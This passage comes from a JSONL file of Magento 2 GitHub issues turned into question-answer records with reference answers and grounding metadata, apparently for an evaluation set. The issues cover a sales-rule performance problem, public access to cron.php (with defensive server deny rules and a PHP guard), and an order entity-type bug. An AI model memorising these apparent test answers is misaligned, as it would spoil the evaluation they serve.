for this GitHub issue.", "role": "comment"}, {"id": "c7", "author": "m2-assistant", "timestamp": "2026-02-24T05:54:47Z", "body": ":white_check_mark: Confirmed by @engcom-Hotel. Thank you for verifying the issue. <br/> **Issue Available**: @engcom-Hotel, _You will be automatically unassigned. Contributors/Maintainers can claim this issue to continue. To reclaim and continue work, reassign the ticket to yourself._", "role": "comment"}, {"id": "c8", "author": "Vishrootways", "timestamp": "2026-04-09T11:31:35Z", "body": "Hello,\n\nWe recently upgraded our Magento site from 2.4.3 to 2.4.8-p2. Before the upgrade, we were able to add 500+ items to the cart and successfully place orders without any issues.\n\nHowever, after upgrading to 2.4.8-p2, we are encountering a timeout error on the Estimate Shipping API/URL. As a result, no shipping methods are being loaded, which prevents order placement.\n\nIf this issue is known or related to the recent upgrade, could you please advise if there is any temporary patch or workaround available until Magento officially releases a fix?\n\n@senthilengg If you have patch or fix then kindly share it with us.", "role": "comment"}], "qa_pairs": [{"qid": "magento/magento2/issue/40226#1", "question": "In Magento, on all versions, `Magento\\SalesRule\\Model\\Plugin\\QuoteConfigProductAttributes::afterGetProductAttributes` appears to trigger `salesrule_product_attributes` table selects and retrieve sales rule attribute data from EAV even when `collectTotals` has not fired.\n\nSteps to reproduce:\n1. Add products to cart; `collectTotals` should have completed here.\n2. Enable DB Query Log.\n3. Hit the cart page URL.\n4. To confirm the query fired, run `cat var/log/db.log | grep \"salesrule_product_attribute\"` from the Magento root.\n\nExpected result: the `salesrule_product_attribute` query should be fired only when `collectTotals` is happening.\n\nActual result: the `salesrule_product_attribute` query is fired always.\n\nFor large catalogs and companies running many promotions, this matters. If there is no need for `collectTotals` to run, which is a heavy process, why should this plugin run and retrieve data? On a million-product catalog, this table can contain a few 100k rows, which adds load time and leads to a performance bottleneck. Is this expected behavior, or should it be addressed?", "answer": "The maintainer confirmed this as a performance issue after deeper analysis. The plugin fires on every quote item collection load, not just during totals collection, causing unnecessary `salesrule_product_attribute` queries and EAV attribute loading even when totals are not recalculated. Suggested potential solutions were lazy loading only when `collectTotals()` runs, adding a conditional flag before loading attributes, caching active attributes per store/customer group, or moving the loading closer to rule validation during totals collection.", "knowledge_type": "grounded", "grounding_sources": ["app/code/Magento/SalesRule/Model/Plugin/QuoteConfigProductAttributes.php#L41-L49", "Quote\\Model\\ResourceModel\\Quote\\Item\\Collection.php line 262"], "answer_grounded_in": "c4", "leak_flags": []}], "answer_in_thread_refs": [], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-18T04:55:10.076962Z", "review_note": ""}
{"id": "magento/magento2/issue/40190", "repo": "magento/magento2", "number": 40190, "title": "Public accessibility of cron.php causes errors and security concerns", "url": "https://github.com/magento/magento2/issues/40190", "state": "closed", "created_at": "2025-09-12T12:34:50Z", "closed_at": "2026-04-03T15:38:07Z", "labels": ["Component: Cron", "Issue: Confirmed", "Triage: Dev.Experience", "Reproduced on 2.4.x", "Priority: P2", "Area: Framework", "Reported on 2.4.8"], "reporter": "Gurdit", "security_topic": "public access to cron.php and server-level blocking", "qa_summary": "Whether Magento\u2019s public `pub/cron.php` exposure should be treated as a security concern, anchored by the referenced `pub/.htaccess` rules in `https://github.com/magento/magento2/blob/c8ff03033f9d79d9e6b6482086940153a28c6443/pub/.htaccess#L225-L234` and the maintainer\u2019s confirmation that the web version of cron.php is not recommended.", "question_comment_id": "c0", "answer_comment_id": "c3", "question_author": "Gurdit", "answer_author": "devchris79", "answerer_role": "commenter", "artifacts_needed": ["documentation", "code"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": [], "fix_commits": ["c8ff03033f9d79d9e6b6482086940153a28c6443"], "advisory_urls": []}, "human_note": "", "llm_confidence": 0.7124999999999999, "comments": [{"id": "c0", "author": "Gurdit", "timestamp": "2025-09-12T12:34:50Z", "body": "### Preconditions and environment\n\nMagento / Adobe Commerce 2.4.8\n\n### Steps to reproduce\n\n1. Install Magento 2\n2. Open a browser and navigate to https://yourdomain.com/cron.php.\n\n### Expected result\n\n1. cron.php should not be publicly accessible in a production environment.\n2. Magento cron jobs should only run via CLI (bin/magento cron:run) and system cron tasks.\n\n### Actual result\n\n1. cron.php is exposed to the web by default.\n2. If executed via HTTP, it can cause runtime errors, e.g.:\n`TypeError: implode(): Argument #1 ($array) must be of type array, string given in /app/bvu7cj4frt2um/vendor/magento/module-cron/Observer/ProcessCronQueueObserver.php:967`\n\n### Additional information\n\n- cron.php exposure appears to be a legacy carryover from Magento 1, where web crons were common on shared hosting.\n- Current Adobe Commerce documentation recommends system-level CLI cron only (bin/magento cron:run).\n- Executing cron.php via HTTP can cause errors (e.g. implode(): Argument #1 ($array) must be of type array, string given) and may unnecessarily increase the attack surface.\n- In modern deployments, cron.php is not required, but its presence in pub/ causes confusion about best practices.\n- Clarification is needed whether this file should be considered deprecated or officially supported.\n\n### Release note\n\n_No response_\n\n### Triage and priority\n\n- [ ] Severity: **S0** _- Affects critical data or functionality and leaves users without workaround._\n- [ ] Severity: **S1** _- Affects critical data or functionality and forces users to employ a workaround._\n- [ ] Severity: **S2** _- Affects non-critical data or functionality and forces users to employ a workaround._\n- [x] Severity: **S3** _- Affects non-critical data or functionality and does not force users to employ a workaround._\n- [ ] Severity: **S4** _- Affects aesthetics, professional look and feel, \u201cquality\u201d or \u201cusability\u201d._", "role": "body"}, {"id": "c1", "author": "m2-assistant", "timestamp": "2025-09-12T12:34:54Z", "body": "Hi @Gurdit. Thank you for your report. \nTo speed up processing of this issue, make sure that the issue is reproducible on the vanilla Magento instance following **Steps to reproduce**. \n- For more details, review the [Magento Contributor Assistant](https://developer.adobe.com/commerce/contributor/guides/code-contributions/#contributor-assistant) documentation.\n- Add a comment to [assign the issue](https://developer.adobe.com/commerce/contributor/guides/code-ontributions/#assigning-an-issue): `@magento I am working on this` \n- To learn more about issue processing workflow, refer to the [Code Contributions](https://developer.adobe.com/commerce/contributor/guides/code-contributions/).\n---\nJoin [Magento Community Engineering Slack](https://developer.adobe.com/open/magento/slack) and ask your questions in [#github](https://magentocommeng.slack.com/messages/C7KB93M32) channel. \n :warning: According to the Magento Contribution requirements, all issues must go through the Community Contributions Triage process. Community Contributions Triage is a public meeting. \n:clock10: You can find the schedule on the [Magento Community Calendar page](https://www.adobe.io/open/magento/calendar).\n:telephone_receiver: The triage of issues happens in the queue order. If you want to speed up the delivery of your contribution, join the Community Contributions Triage session to discuss the appropriate ticket.", "role": "comment"}, {"id": "c2", "author": "m2-assistant", "timestamp": "2025-09-12T12:57:17Z", "body": "Hi @engcom-Bravo. Thank you for working on this issue. \nIn order to make sure that issue has enough information and ready for development, please read and check the following instruction: :point_down:\n- [ ] 1. Verify that issue has all the required information. (**Preconditions**, **Steps to reproduce**, **Expected result**, **Actual result**).\n- [ ] 2. Verify that issue has a meaningful description and provides enough information to reproduce the issue. \n- [ ] 3. Add `Area: XXXXX` label to the ticket, indicating the functional areas it may be related to.\n- [ ] 4. Verify that the issue is reproducible on `2.4-develop` branch<details><summary>Details</summary>- If the issue is reproducible on `2.4-develop` branch, please, add the label `Reproduced on 2.4.x`.<br/>- If the issue is not reproducible, add your comment that issue is not reproducible and close the issue and **_stop verification process here_**!</details>\n- [ ] 5. Add label `Issue: Confirmed` once verification is complete. \n- [ ] 6. Make sure that automatic system confirms that report has been added to the backlog.", "role": "comment"}, {"id": "c3", "author": "devchris79", "timestamp": "2025-09-12T15:35:41Z", "body": "You should have an entry in .htaccess (within pub folder) that prevents cron.php execution, like this:\n\nhttps://github.com/magento/magento2/blob/c8ff03033f9d79d9e6b6482086940153a28c6443/pub/.htaccess#L225-L234\n", "role": "comment"}, {"id": "c4", "author": "WebHostingAce", "timestamp": "2025-09-15T01:22:45Z", "body": "@Gurdit, If you are running on NGINX, convert the .htaccess rules into the corresponding NGINX configuration.\n", "role": "comment"}, {"id": "c5", "author": "engcom-Bravo", "timestamp": "2025-09-15T09:00:23Z", "body": "@devchris79 @WebHostingAce Thanks for your Contribution!!\n\nHi @Gurdit,\n\nThanks for your reporting and collaboration.\n\nCould you please refer the above comments https://github.com/magento/magento2/issues/40190#issuecomment-3285755135 https://github.com/magento/magento2/issues/40190#issuecomment-3290172608 and please let us know if you are still facing any issue.\n\nThanks.", "role": "comment"}, {"id": "c6", "author": "koushikch7", "timestamp": "2025-09-24T18:09:39Z", "body": "<h1 data-start=\"70\" data-end=\"99\">Possible Strategies / Fixes</h1>\n<p data-start=\"101\" data-end=\"241\">You\u2019ll have to choose a path depending on your constraints (hosting, infra, CDNs, etc.). Below are options; I\u2019ll also sketch a sample patch.</p>\n\nStrategy | Pros | Cons / Risks\n-- | -- | --\nBlock HTTP access via web server (Apache / Nginx rules) | Simple, doesn\u2019t require code change. Can return 403/404 for cron.php via HTTP. | Requires control of server config. Might block legitimate HTTP calls if any custom use.\nIn-code guard in cron.php itself | Self-protecting: if accessed via HTTP, exit early or redirect. | cron.php may be overwritten in upgrades; you must maintain patch.\nRemove/disable cron.php file in pub/ (or root) via installation process | Eliminates the endpoint entirely. | Some legacy plugins might expect it; may break fallback, legacy workflows.\nWrap cron-logic so HTTP execution fails safely | Even if cron.php is invoked, it doesn\u2019t crash (fails silently or safe exit). | Adds overhead and complexity; must ensure no side effects.\nDocumentation / deprecation / backward-compatibility announcement | Sets expectations for users; upstream can follow with official removal. | Doesn\u2019t solve in existing deployed sites; reactive.\n\n</div></div>\n<hr data-start=\"1349\" data-end=\"1352\">\n<h1 data-start=\"1354\" data-end=\"1387\">Sketching a Patch / Guard Logic</h1>\n<p data-start=\"1389\" data-end=\"1510\">If you go with the <strong data-start=\"1408\" data-end=\"1425\">in-code guard</strong> approach, place early checks in <code data-start=\"1458\" data-end=\"1472\">pub/cron.php</code> before executing the core cron logic:</p>\n<pre class=\"overflow-visible!\" data-start=\"1512\" data-end=\"1930\"><div class=\"contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary\"><div class=\"sticky top-9\"><div class=\"absolute end-0 bottom-0 flex h-9 items-center pe-2\"><div class=\"bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs\"></div></div></div><div class=\"overflow-y-auto p-4\" dir=\"ltr\"><code class=\"whitespace-pre! language-php\"><span><span><span class=\"hljs-meta\">&lt;?php</span></span><span>\n</span><span><span class=\"hljs-comment\">// pub/cron.php (or root/cron.php) \u2014 Patch start</span></span><span>\n\n</span><span><span class=\"hljs-comment\">// If request is via HTTP (i.e. $_SERVER['REQUEST_METHOD'] is set), block it</span></span><span>\n</span><span><span class=\"hljs-keyword\">if</span></span><span> (</span><span><span class=\"hljs-title function_ invoke__\">php_sapi_name</span></span><span>() !== </span><span><span class=\"hljs-string\">'cli'</span></span><span> &amp;&amp; </span><span><span class=\"hljs-keyword\">isset</span></span><span>(</span><span><span class=\"hljs-variable\">$_SERVER</span></span><span>[</span><span><span class=\"hljs-string\">'REQUEST_METHOD'</span></span><span>])) {\n    </span><span><span class=\"hljs-comment\">// Option A: send 404</span></span><span>\n    </span><span><span class=\"hljs-title function_ invoke__\">header</span></span><span>(</span><span><span class=\"hljs-string\">\"HTTP/1.1 404 Not Found\"</span></span><span>);\n    </span><span><span class=\"hljs-keyword\">exit</span></span><span>;\n\n    </span><span><span class=\"hljs-comment\">// Option B: send 403 Forbidden</span></span><span>\n    </span><span><span class=\"hljs-comment\">// header(\"HTTP/1.1 403 Forbidden\");</span></span><span>\n    </span><span><span class=\"hljs-comment\">// exit;</span></span><span>\n}\n\n</span><span><span class=\"hljs-comment\">// ... rest of normal cron.php logic</span></span><span>\n</span></span></code></div></div></pre>\n<p data-start=\"1932\" data-end=\"2047\">Additionally, wrap around parts where arrays or <code data-start=\"1980\" data-end=\"1989\">implode</code> is used, to avoid runtime errors when input is malformed:</p>\n<pre class=\"overflow-visible!\" data-start=\"2049\" data-end=\"2255\"><div class=\"contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary\"><div class=\"sticky top-9\"><div class=\"absolute end-0 bottom-0 flex h-9 items-center pe-2\"><div class=\"bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs\"></div></div></div><div class=\"overflow-y-auto p-4\" dir=\"ltr\"><code class=\"whitespace-pre! language-php\"><span><span><span class=\"hljs-comment\">// Example where implode is used: make sure input is array</span></span><span>\n</span><span><span class=\"hljs-variable\">$someVar</span></span><span> = </span><span><span class=\"hljs-comment\">/* whatever source */</span></span><span>;\n</span><span><span class=\"hljs-keyword\">if</span></span><span> (!</span><span><span class=\"hljs-title function_ invoke__\">is_array</span></span><span>(</span><span><span class=\"hljs-variable\">$someVar</span></span><span>)) {\n    </span><span><span class=\"hljs-variable\">$someVar</span></span><span> = []; </span><span><span class=\"hljs-comment\">// or cast / convert</span></span><span>\n}\n</span><span><span class=\"hljs-variable\">$joined</span></span><span> = </span><span><span class=\"hljs-title function_ invoke__\">implode</span></span><span>(</span><span><span class=\"hljs-string\">','</span></span><span>, </span><span><span class=\"hljs-variable\">$someVar</span></span><span>);\n</span></span></code></div></div></pre>\n<p data-start=\"2257\" data-end=\"2301\">The key is: <strong data-start=\"2269\" data-end=\"2300\">short-circuit HTTP requests</strong>.</p>\n<hr data-start=\"2303\" data-end=\"2306\">\n<h1 data-start=\"2308\" data-end=\"2341\">Alternative Server-Level Blocks</h1>\n<h3 data-start=\"2343\" data-end=\"2381\">Apache (<code data-start=\"2355\" data-end=\"2366\">.htaccess</code> inside <code data-start=\"2374\" data-end=\"2380\">pub/</code>)</h3>\n<pre class=\"overflow-visible!\" data-start=\"2383\" data-end=\"2447\"><div class=\"contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary\"><div class=\"sticky top-9\"><div class=\"absolute end-0 bottom-0 flex h-9 items-center pe-2\"><div class=\"bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs\"></div></div></div><div class=\"overflow-y-auto p-4\" dir=\"ltr\"><code class=\"whitespace-pre! language-apache\"><span>&lt;Files \"cron.php\"&gt;\n    Require all denied\n&lt;/Files&gt;\n</span></code></div></div></pre>\n<h3 data-start=\"2449\" data-end=\"2458\">Nginx</h3>\n<pre class=\"overflow-visible!\" data-start=\"2460\" data-end=\"2527\"><div class=\"contain-inline-size rounded-2xl relative bg-token-sidebar-surface-primary\"><div class=\"sticky top-9\"><div class=\"absolute end-0 bottom-0 flex h-9 items-center pe-2\"><div class=\"bg-token-bg-elevated-secondary text-token-text-secondary flex items-center gap-4 rounded-sm px-2 font-sans text-xs\"></div></div></div><div class=\"overflow-y-auto p-4\" dir=\"ltr\"><code class=\"whitespace-pre! language-nginx\"><span><span><span class=\"hljs-section\">location</span></span><span> = /cron.php {\n    </span><span><span class=\"hljs-attribute\">deny</span></span><span> all;\n    </span><span><span class=\"hljs-attribute\">return</span></span><span> </span><span><span class=\"hljs-number\">404</span></span><span>;\n}\n</span></span></code></div></div></pre>\n<hr data-start=\"2529\" data-end=\"2532\">\n<h1 data-start=\"2534\" data-end=\"2564\">Steps You\u2019d Take (Practical)</h1>\n<ol data-start=\"2566\" data-end=\"3427\">\n<li data-start=\"2566\" data-end=\"2671\">\n<p data-start=\"2569\" data-end=\"2671\">Identify exactly where <code data-start=\"2592\" data-end=\"2602\">cron.php</code> resides in your Magento setup (<code data-start=\"2634\" data-end=\"2649\">root/cron.php</code> or <code data-start=\"2653\" data-end=\"2667\">pub/cron.php</code>).</p>\n</li>\n<li data-start=\"2672\" data-end=\"2860\">\n<p data-start=\"2675\" data-end=\"2742\">Decide whether your environment allows <strong data-start=\"2714\" data-end=\"2739\">server config changes</strong>.</p>\n<ul data-start=\"2746\" data-end=\"2860\">\n<li data-start=\"2746\" data-end=\"2808\">\n<p data-start=\"2748\" data-end=\"2808\">If yes \u2192 block at Apache/Nginx level (preferred, cleaner).</p>\n</li>\n<li data-start=\"2812\" data-end=\"2860\">\n<p data-start=\"2814\" data-end=\"2860\">If no \u2192 patch <code data-start=\"2828\" data-end=\"2838\">cron.php</code> with in-code guard.</p>\n</li>\n</ul>\n</li>\n<li data-start=\"2861\" data-end=\"2949\">\n<p data-start=\"2864\" data-end=\"2949\">If patching, keep it in a <strong data-start=\"2890\" data-end=\"2919\">diff file or patch folder</strong> so it\u2019s version-controlled.</p>\n</li>\n<li data-start=\"2950\" data-end=\"3029\">\n<p data-start=\"2953\" data-end=\"3029\">Add <strong data-start=\"2957\" data-end=\"2985\">unit / integration tests</strong> (if possible) for HTTP vs CLI invocation.</p>\n</li>\n<li data-start=\"3030\" data-end=\"3270\">\n<p data-start=\"3033\" data-end=\"3076\">Deploy to <strong data-start=\"3043\" data-end=\"3060\">staging first</strong>, then verify:</p>\n<ul data-start=\"3080\" data-end=\"3270\">\n<li data-start=\"3080\" data-end=\"3157\">\n<p data-start=\"3082\" data-end=\"3157\"><code data-start=\"3082\" data-end=\"3120\">curl https://yourdomain.com/cron.php</code> gives <code data-start=\"3127\" data-end=\"3132\">404</code>/<code data-start=\"3133\" data-end=\"3138\">403</code> or no execution.</p>\n</li>\n<li data-start=\"3161\" data-end=\"3231\">\n<p data-start=\"3163\" data-end=\"3231\">Cron tasks via CLI (<code data-start=\"3183\" data-end=\"3205\">bin/magento cron:run</code>) still run as expected.</p>\n</li>\n<li data-start=\"3235\" data-end=\"3270\">\n<p data-start=\"3237\" data-end=\"3270\">No side effects in other flows.</p>\n</li>\n</ul>\n</li>\n<li data-start=\"3271\" data-end=\"3427\">\n<p data-start=\"3274\" data-end=\"3427\">For completeness, consider filing a <strong data-start=\"3310\" data-end=\"3326\">pull request</strong> (if your change is generic) or join discussion upstream to deprecate/remove the public <code data-start=\"3414\" data-end=\"3424\">cron.php</code>.</p></li></ol>", "role": "comment"}, {"id": "c7", "author": "engcom-Bravo", "timestamp": "2025-09-25T11:41:27Z", "body": "@koushikch7 Thanks for your Contribution!!.\n\nHi @Gurdit,\n\nKindly refer the above comment and please let us know if you are still facing any issue.\n\nThanks.", "role": "comment"}, {"id": "c8", "author": "hostep", "timestamp": "2025-09-25T13:33:34Z", "body": "Would be good to know if anybody still relies on the `pub/cron.php` file to exist, because in my opinion nobody should rely on it and we should simply remove it from the codebase.", "role": "comment"}, {"id": "c9", "author": "engcom-Hotel", "timestamp": "2025-10-06T12:24:26Z", "body": "Hello @Gurdit,\n\nThanks for the report and collaboration!\n\nWe have tried to reproduce the issue in the latest development branch i.e. 2.4-develop but the issue is not reproducible for us in both Apache and Nginx.\n\nBoth gives us 404 page not found error as below:\n\n<img width=\"2880\" height=\"1330\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/35c33207-0067-4ae7-ab6d-4b6161f8e6e4\" />\n\nPlease try to reproduce the issue in the 2.4-develop branch and let us know if we missed anything.\n\nThank you", "role": "comment"}, {"id": "c10", "author": "engcom-Hotel", "timestamp": "2025-12-10T12:07:39Z", "body": "> Would be good to know if anybody still relies on the `pub/cron.php` file to exist, because in my opinion nobody should rely on it and we should simply remove it from the codebase.\n\nI agree with @hostep's comment above, I think it is not recommended to use the web version of cron.php, hence confirming this issue.\n\nHello @Gurdit,\n\nThank you for bringing this issue to our attention. If you have a potential solution, we encourage you to submit a pull request. Your contributions significantly enhance Magento Open Source for everyone. Should you need any assistance, please don't hesitate to ask!", "role": "comment"}, {"id": "c11", "author": "github-jira-sync-bot", "timestamp": "2025-12-10T12:08:25Z", "body": ":white_check_mark: Jira issue https://jira.corp.adobe.com/browse/AC-16194 is successfully created for this GitHub issue.", "role": "comment"}, {"id": "c12", "author": "m2-assistant", "timestamp": "2025-12-10T12:08:28Z", "body": ":white_check_mark: Confirmed by @engcom-Hotel. Thank you for verifying the issue. <br/> **Issue Available**: @engcom-Hotel, _You will be automatically unassigned. Contributors/Maintainers can claim this issue to continue. To reclaim and continue work, reassign the ticket to yourself._", "role": "comment"}], "qa_pairs": [{"qid": "magento/magento2/issue/40190#1", "question": "In Magento / Adobe Commerce 2.4.8, after installing Magento 2, I can open a browser and navigate to `https://yourdomain.com/cron.php`. I expected `cron.php` not to be publicly accessible in a production environment, and expected Magento cron jobs to run only via CLI (`bin/magento cron:run`) and system cron tasks. Instead, `cron.php` appears to be exposed to the web by default, and if executed via HTTP it can cause runtime errors such as:\n\n`TypeError: implode(): Argument #1 ($array) must be of type array, string given in /app/bvu7cj4frt2um/vendor/magento/module-cron/Observer/ProcessCronQueueObserver.php:967`\n\nThis exposure looks like a legacy carryover from Magento 1 web crons on shared hosting. Current Adobe Commerce documentation recommends system-level CLI cron only (`bin/magento cron:run`). In modern deployments, `cron.php` does not seem required, but its presence in `pub/` causes confusion about best practices and may unnecessarily increase the attack surface. Should `cron.php` be publicly accessible / officially supported, or should it be blocked or considered deprecated?", "answer": "The response was that `pub/.htaccess` should contain rules that prevent execution of `cron.php`, and the linked Magento `pub/.htaccess` lines were pointed to as the relevant configuration. For NGINX, the equivalent `.htaccess` rules should be converted into NGINX configuration. Later verification on the `2.4-develop` branch found the issue not reproducible on both Apache and NGINX because both returned a 404, and a maintainer agreed that the web version of `cron.php` is not recommended and confirmed the issue for contribution.\n\nhttps://github.com/magento/magento2/blob/c8ff03033f9d79d9e6b6482086940153a28c6443/pub/.htaccess#L225-L234\n\n```\n## Deny access  to cron.php\n    <Files cron.php>\n        <IfVersion < 2.4>\n            order allow,deny\n            deny from all\n        </IfVersion>\n        <IfVersion >= 2.4>\n            Require all denied\n        </IfVersion>\n    </Files>\n```", "knowledge_type": "grounded", "grounding_sources": ["https://github.com/magento/magento2/blob/c8ff03033f9d79d9e6b6482086940153a28c6443/pub/.htaccess#L225-L234", "Magento 2.4-develop branch"], "answer_grounded_in": "c3, c9, c10", "leak_flags": []}], "answer_in_thread_refs": ["c8ff03033f9d79d9e6b6482086940153a28c6443", "https://github.com/magento/magento2/blob/c8ff03033f9d79d9e6b6482086940153a28c6443/pub/.htaccess#L225-L234"], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-18T05:02:09.631630Z", "review_note": ""}
{"id": "magento/magento2/issue/40154", "repo": "magento/magento2", "number": 40154, "title": "Magento changed the entity type of $order after calls $invoice = $this->_invoiceService->prepareInvoice($order);", "url": "https://github.com/magento/magento2/issues/40154", "state": "closed", "created_at": "2025-08-25T06:47:47Z", "closed_at": "2025-11-18T06:39:26Z", "labels": ["Component: Sales", "Issue: Confirmed", "Progress: PR Created", "Triage: Dev.Experience", "Reproduced on 2.4.x", "Priority: P2", "Progress: done", "Area: Order", "Reported on 2.4.8-p2"], "reporter": "RadarsofthouseDev", "security_topic": "object state mutation during invoice preparation", "qa_summary": "Whether the order entity type mutation bug was fixed in AC-15401 and the answer rests on the AC-15401 commit b127bcbc9de24412589eb492a7a7b6b91d4ce77f and the stated target version 2.4.9-beta1.", "question_comment_id": "c0", "answer_comment_id": "c8", "question_author": "RadarsofthouseDev", "answer_author": "engcom-Bravo", "answerer_role": "maintainer", "artifacts_needed": ["commit_history", "issue_tracker"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": ["2.4.9-beta1"], "fix_prs": [], "fix_commits": ["b127bcbc9de24412589eb492a7a7b6b91d4ce77f"], "advisory_urls": []}, "human_note": "This is a clear object state integrity bug in core order/invoice workflow, which can lead to incorrect business logic execution (order object being mutated into invoice state).", "llm_confidence": 0.5625, "comments": [{"id": "c0", "author": "RadarsofthouseDev", "timestamp": "2025-08-25T06:47:47Z", "body": "### Preconditions and environment\n\n- Magento version: 2.4.8-p2\n\n### Steps to reproduce\n\n1. Create a custom script or use a module with the following code:\n```php\n/** @var \\Magento\\Sales\\Api\\OrderRepositoryInterface $orderRepository */\n/** @var \\Magento\\Sales\\Model\\Service\\InvoiceService $invoiceService */\n\n$orderId = 7030365; // use a valid order_id that can be invoiced\n$order = $orderRepository->get($orderId);\n\n$this->_logger->info(\"Before entity type: \" . $order->getEntityType());\n$invoice = $invoiceService->prepareInvoice($order);\n$this->_logger->info(\"After entity type: \" . $order->getEntityType());`\n```\n2. Run the custom script.\n\n\n\n### Expected result\n```php\nBefore entity type: order\nAfter entity type: order\n```\n### Actual result\n```php\nBefore entity type: order\nAfter entity type: invoice\n```\n### Additional information\n\nThe $order object\u2019s entity type changes to invoice after calling prepareInvoice().\n$order should always remain of entity type \"order\".\n\n**Impact:**\nThis behavior can cause unexpected side effects:\nOther logic using the same $order object may incorrectly treat it as an invoice.\nLeads to data integrity issues and inconsistent behavior.\n\n### Release note\n\n_No response_\n\n### Triage and priority\n\n- [ ] Severity: **S0** _- Affects critical data or functionality and leaves users without workaround._\n- [ ] Severity: **S1** _- Affects critical data or functionality and forces users to employ a workaround._\n- [ ] Severity: **S2** _- Affects non-critical data or functionality and forces users to employ a workaround._\n- [ ] Severity: **S3** _- Affects non-critical data or functionality and does not force users to employ a workaround._\n- [ ] Severity: **S4** _- Affects aesthetics, professional look and feel, \u201cquality\u201d or \u201cusability\u201d._", "role": "body"}, {"id": "c1", "author": "m2-assistant", "timestamp": "2025-08-25T06:47:51Z", "body": "Hi @RadarsofthouseDev. Thank you for your report. \nTo speed up processing of this issue, make sure that the issue is reproducible on the vanilla Magento instance following **Steps to reproduce**. \n- For more details, review the [Magento Contributor Assistant](https://developer.adobe.com/commerce/contributor/guides/code-contributions/#contributor-assistant) documentation.\n- Add a comment to [assign the issue](https://developer.adobe.com/commerce/contributor/guides/code-ontributions/#assigning-an-issue): `@magento I am working on this` \n- To learn more about issue processing workflow, refer to the [Code Contributions](https://developer.adobe.com/commerce/contributor/guides/code-contributions/).\n---\nJoin [Magento Community Engineering Slack](https://developer.adobe.com/open/magento/slack) and ask your questions in [#github](https://magentocommeng.slack.com/messages/C7KB93M32) channel. \n :warning: According to the Magento Contribution requirements, all issues must go through the Community Contributions Triage process. Community Contributions Triage is a public meeting. \n:clock10: You can find the schedule on the [Magento Community Calendar page](https://www.adobe.io/open/magento/calendar).\n:telephone_receiver: The triage of issues happens in the queue order. If you want to speed up the delivery of your contribution, join the Community Contributions Triage session to discuss the appropriate ticket.", "role": "comment"}, {"id": "c2", "author": "m2-assistant", "timestamp": "2025-08-28T09:19:16Z", "body": "Hi @engcom-Hotel. Thank you for working on this issue. \nIn order to make sure that issue has enough information and ready for development, please read and check the following instruction: :point_down:\n- [ ] 1. Verify that issue has all the required information. (**Preconditions**, **Steps to reproduce**, **Expected result**, **Actual result**).\n- [ ] 2. Verify that issue has a meaningful description and provides enough information to reproduce the issue. \n- [ ] 3. Add `Area: XXXXX` label to the ticket, indicating the functional areas it may be related to.\n- [ ] 4. Verify that the issue is reproducible on `2.4-develop` branch<details><summary>Details</summary>- If the issue is reproducible on `2.4-develop` branch, please, add the label `Reproduced on 2.4.x`.<br/>- If the issue is not reproducible, add your comment that issue is not reproducible and close the issue and **_stop verification process here_**!</details>\n- [ ] 5. Add label `Issue: Confirmed` once verification is complete. \n- [ ] 6. Make sure that automatic system confirms that report has been added to the backlog.", "role": "comment"}, {"id": "c3", "author": "engcom-Hotel", "timestamp": "2025-08-28T10:01:41Z", "body": "Hello @RadarsofthouseDev,\n\nThanks for the report and collaboration!\n\nWe have tried to reproduce the issue in the latest 2.4-develop branch and the issue seems reproducible for us. The entity type has changed from `order` to `invoice` after `prepareInvoice()` method call.\n\nHence confirming the issue.\n\nThank you for bringing this issue to our attention. If you have a potential solution, we encourage you to submit a pull request. Your contributions significantly enhance Magento Open Source for everyone. Should you need any assistance, please don't hesitate to ask!\n\nThanks", "role": "comment"}, {"id": "c4", "author": "github-jira-sync-bot", "timestamp": "2025-08-28T10:02:30Z", "body": ":white_check_mark: Jira issue https://jira.corp.adobe.com/browse/AC-15401 is successfully created for this GitHub issue.", "role": "comment"}, {"id": "c5", "author": "m2-assistant", "timestamp": "2025-08-28T10:02:32Z", "body": ":white_check_mark: Confirmed by @engcom-Hotel. Thank you for verifying the issue. <br/> **Issue Available**: @engcom-Hotel, _You will be automatically unassigned. Contributors/Maintainers can claim this issue to continue. To reclaim and continue work, reassign the ticket to yourself._", "role": "comment"}, {"id": "c6", "author": "engcom-Bravo", "timestamp": "2025-09-25T10:23:11Z", "body": "Hi @RadarsofthouseDev,\n\nAdobe Commerce Engineering team started working on this issue. We will reach out to you if we need more information and you will get notified once the issue is fixed. Please leave comments for any further questions. \n\nThank you!", "role": "comment"}, {"id": "c7", "author": "hostep", "timestamp": "2025-11-17T14:57:21Z", "body": "Possibly fixed by [AC-15401: order entity type change durring invoice](https://github.com/magento/magento2/commit/b127bcbc9de24412589eb492a7a7b6b91d4ce77f) ?", "role": "comment"}, {"id": "c8", "author": "engcom-Bravo", "timestamp": "2025-11-18T06:39:27Z", "body": "Hello,\n\nAs I can see this issue got fixed in the scope of the internal Jira ticket AC-15401 by the internal team\nRelated commits:https://github.com/search?q=repo%3Amagento%2Fmagento2+AC-15401&type=commits\n\nBased on the Jira ticket, the target version is 2.4.9-beta1.\n\nThanks", "role": "comment"}], "qa_pairs": [{"qid": "magento/magento2/issue/40154#1", "question": "In Magento 2.4.8-p2, calling `InvoiceService::prepareInvoice($order)` appears to mutate the same `$order` object's entity type from `order` to `invoice`. Is this a confirmed Magento issue, and if so where/when is it fixed?\n\nReproduction:\n```php\n/** @var \\Magento\\Sales\\Api\\OrderRepositoryInterface $orderRepository */\n/** @var \\Magento\\Sales\\Model\\Service\\InvoiceService $invoiceService */\n\n$orderId = 7030365; // use a valid order_id that can be invoiced\n$order = $orderRepository->get($orderId);\n\n$this->_logger->info(\"Before entity type: \" . $order->getEntityType());\n$invoice = $invoiceService->prepareInvoice($order);\n$this->_logger->info(\"After entity type: \" . 